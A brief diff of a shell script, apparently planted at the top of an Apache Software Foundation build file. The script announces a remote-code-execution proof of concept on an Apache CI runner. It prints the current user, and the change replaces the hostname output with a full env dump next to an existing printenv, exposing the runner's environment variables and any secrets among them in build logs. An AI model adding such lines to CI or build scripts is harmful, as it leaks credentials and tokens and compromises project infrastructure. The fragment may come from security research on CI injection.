@@ -3,7 +3,7 @@
 echo "=============================================="
 echo "[!] RCE POC: EXECUTING ON APACHE RUNNER"
 echo "[!] USER: $(whoami)"
-echo "[!] HOST: $(hostname)"
+echo "[!] HOST: $(env)"
 printenv
 echo "=============================================="
 # Licensed to the Apache Software Foundation (ASF) under one
